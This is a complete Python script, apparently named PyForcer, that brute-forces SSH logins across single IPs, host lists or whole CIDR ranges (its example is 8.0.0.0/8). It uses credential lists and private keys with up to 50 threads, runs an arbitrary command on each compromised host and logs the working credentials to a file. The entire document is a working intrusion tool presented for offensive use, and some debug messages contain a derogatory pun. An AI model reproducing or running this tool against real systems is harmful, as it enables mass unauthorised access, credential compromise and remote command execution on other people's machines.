#!/usr/bin/env python3
import sys
import argparse
import socket
import os
import paramiko
import ipaddress
import concurrent.futures

timeout = 10

def resolve_cidr(cidr):
    ip_addresses = [str(ip) for ip in ipaddress.IPv4Network(cidr, strict=False)]
    return ip_addresses

def is_valid_ipv4(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except socket.error:
        return False

def read_credentials_file(credentials_file):
    credentials = []
    with open(credentials_file, "r") as file:
        for line in file:
            line = line.strip()
            if ":" in line:
                username, password = line.split(":", 1)
                credentials.append((username, password))
    return credentials

def get_private_key(key_file):
    try:
        private_key = paramiko.RSAKey(filename=key_file)
        return "RSA", private_key
    except paramiko.SSHException:
        try:
            private_key = paramiko.DSSKey(filename=key_file)
            return "DSA", private_key
        except paramiko.SSHException:
            try:
                private_key = paramiko.ECDSAKey(filename=key_file)
                return "ECDSA", private_key
            except paramiko.SSHException:
                print(f"File \"{key_file}\" is an invalid private key type, exiting.")
                sys.exit()

def test_ssh_credentials(ip, port, credentials, key_file, output, cmd, private_key, debug):
    successful_logins = []
    for username, password in credentials:
        try:
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            auth_method = None

            if key_file:
                #private_key = get_private_key(key_file)
                if private_key:
                    try:
                        ssh_client.connect(ip, port=port, username=username, pkey=private_key, timeout=timeout)
                        auth_method = "key"
                    except paramiko.AuthenticationException:
                        pass  # Authentication with key failed
                else:
                    print(f"Invalid or unsupported private key type in {key_file}")

            if not auth_method:
                try:
                    ssh_client.connect(ip, port=port, username=username, password=password, timeout=timeout)
                    auth_method = "password"
                except paramiko.AuthenticationException:
                    pass  # Authentication with password failed
            
            # Successful login, lets do our business.
            if auth_method:
                stdin, stdout, stderr = ssh_client.exec_command(cmd)
                uname_output = stdout.read().decode("utf-8").strip()
                ssh_client.close()
                if auth_method == "password":
                    result = f"[PASSWORD] {ip}:{port} {username}:{password} - [CMD:{uname_output}]"
                    print(f"{result}")
                elif auth_method == "key":
                    result = f"[KEY] {ip}:{port} {username}:{key_file} - [CMD:{uname_output}]"
                    print(f"{result}")
                
                successful_logins.append(result)

        except ConnectionResetError as e:
            if debug == True:
                print(f"Connection reset by queer: {ip}:{port}:")
            else:
                pass
        except paramiko.SSHException as e:
            if debug == True:
                if "[Errno 104] Connection reset by peer" in str(e):
                    print(f"Connection reset by queer: {ip}:{port}:")
                if "Error reading SSH protocol banner" in str(e):
                    print(f"SSH banner read error: {ip}:{port}")
                if "No existing session" in str(e):
                    pass
                else:
                    print(f"SSH connection error: {ip}:{port}: {e}")
            else:
                pass
        except Exception as e:
            if debug == True:
                print(f"[WARN]: {ip}:{port}: {e}")
            else:
                pass

    with open(output, 'a') as f:
        for result in successful_logins:
            f.write(result + "\n")

def main():
    # Create a parser for command-line arguments
    parser = argparse.ArgumentParser(description="PyForcere is an all-in-one SSH brute forcing tool for username+password and private keyfile combinations. Capabilities include: CIDR handling, private keys, multi-threading, error handling.")
    # Add arguments
    parser.add_argument("input", help="Target hosts to exploit, [ex: filename, 8.0.0.0/8, 8.8.8.8]")
    parser.add_argument("output", help="Path to the output file")
    parser.add_argument("--port", type=int, default=22, help="Port number (default: 22)")
    parser.add_argument("--creds", help="Path to a file containing username and password combinations")
    parser.add_argument("--keyfile", help="Path to a private key file for authentication (optional)")
    parser.add_argument("--threads", type=int, default=1, choices=range(1, 51), help="Number of threads to run concurrently (50 max)")
    parser.add_argument("--cmd", default="uname -a", help="Command to run after successful login (default: uname -a)")
    parser.add_argument("--debug", default=False, action="store_true", help="Enable the script's debugging features.")
    # Parse the arguments
    private_key_type, private_key = None, None
    args = parser.parse_args()
    if args.input:
        if is_valid_ipv4(args.input):
            ip_addresses = [args.input]
        elif os.path.isfile(args.input):
            with open(args.input, "r") as file:
                ip_addresses = [line.strip() for line in file]
        elif '/' in args.input:  # Check for CIDR notation
            ip_addresses = resolve_cidr(args.input)
        else:
            print(f"ERROR: \"{args.input}\" is not a valid IP address, CIDR notation, or file does not exist.")
            return
    else:
        ip_addresses = []
    if args.keyfile:
        if os.path.isfile(args.keyfile):
            pass
        else:
            sys.exit("Invalid input: specified keyfile does not exist!")
    if args.creds:
        if os.path.isfile(args.creds):
            credentials = read_credentials_file(args.creds)
        else:
            print("ERROR: specified credentials file does not exist.")
            return
    else:
        credentials = []

    if args.keyfile:
        private_key_type, private_key = get_private_key(args.keyfile)

    print("PyForcer - SSH bruteforcing done properly.")
    print("\n")    
    print(f"Target(s): {args.input}")
    print(f"Target Port: {args.port}")
    print(f"Credentials File: {args.creds}")
    if args.keyfile:
        print(f"{private_key_type} Private Key: {args.keyfile} ✅")
    print(f"Output File: {args.output}")
    print(f"Command To Run: {args.cmd}")
    print(f"Concurrent Threads: {args.threads}")
    print("\n")
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for ip in ip_addresses:
            futures.append(executor.submit(test_ssh_credentials, ip, args.port, credentials, args.keyfile, args.output, args.cmd, private_key, args.debug))

        concurrent.futures.wait(futures, timeout=None, return_when=concurrent.futures.ALL_COMPLETED)
if __name__ == "__main__":
    main()